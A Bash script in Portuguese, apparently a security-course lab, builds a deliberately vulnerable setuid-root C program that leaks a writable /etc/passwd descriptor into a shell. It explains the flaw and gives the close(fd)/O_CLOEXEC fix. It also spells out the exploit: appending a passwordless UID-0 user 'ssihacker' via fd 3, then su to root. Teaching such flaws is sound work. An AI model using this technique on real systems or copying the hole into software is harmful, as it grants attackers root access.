#!/bin/bash

echo "=== Setup: Criar e compilar o programa vulnerável ==="
# Criação do código C 
cat << 'EOF' > passwdleak.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    // Abre o /etc/passwd com permissões de escrita (append)
    int fd = open("/etc/passwd", O_WRONLY | O_APPEND);
    if (fd < 0) {
        perror("open /etc/passwd");
        exit(1);
    }
    
    printf("Passwd FD leaked: %d\n", fd);
    
    // Deixa cair os privilégios de root para utilizador normal
    setuid(getuid());
    
    // Lança a shell sem fechar o descritor de ficheiro (FD)
    execl("/bin/sh", "sh", NULL);
    
    return 0;
}
EOF

# Compilar e aplicar permissões
gcc -o passwdleak passwdleak.c
sudo chown root:root passwdleak
sudo chmod 4755 passwdleak
echo "Programa 'passwdleak' compilado e permissões setuid aplicadas."


echo -e "\n=== Análise, Exploração e Mitigação ==="
cat << 'EOF'
2. Identificação da Vulnerabilidade:
O programa abre o ficheiro crítico '/etc/passwd' em modo de escrita/append e lança 
uma shell sem o fechar. A shell herda o descritor de ficheiro (FD) aberto, 
permitindo que um utilizador normal escreva no ficheiro de utilizadores do sistema.

4. Implicações Práticas (O que o exploit possibilita?):
Ao adicionar a linha "ssihacker::0:0::/root:/bin/sh" ao ficheiro passwd, estamos a 
criar um novo utilizador ('ssihacker') com User ID 0 e Group ID 0 (que são os IDs 
do utilizador root). O campo da password está vazio ('::'). 
Isto significa que qualquer pessoa pode agora fazer login como 'ssihacker' sem 
password e ter imediatamente controlo total do sistema (root).

5. Implementação da Correção:
À semelhança do exercício anterior, o problema resolve-se garantindo que o FD não 
é passado para a shell. Podemos fazê-lo de duas formas:
  - Adicionando 'close(fd);' antes da chamada execl().
  - Usando a flag O_CLOEXEC no open: open("/etc/passwd", O_WRONLY | O_APPEND | O_CLOEXEC);
EOF

echo -e "\n=== Como Testar o Exploit ==="
echo "1. Correr o programa vulnerável teu terminal como utilizador normal:"
echo "   ./passwdleak"
echo "   (Ele vai dizer algo como 'Passwd FD leaked: 3')"
echo ""
echo "2. Na nova shell que abriu, injetar o utilizador root falso usando apenas a bash:"
echo "   echo \"ssihacker::0:0::/root:/bin/sh\" >&3"
echo "   (Nota: O '&3' diz à bash para enviar o texto diretamente para o File Descriptor 3)."
echo ""
echo "3. Confirma que funcionou verificando o fim do ficheiro passwd:"
echo "   tail -n 1 /etc/passwd"
echo ""
echo "4. Fazer o ataque final (login como o novo super-utilizador sem password):"
echo "   su ssihacker"
echo "   (Verifica com o comando 'id' que agora é efetivamente root!)"
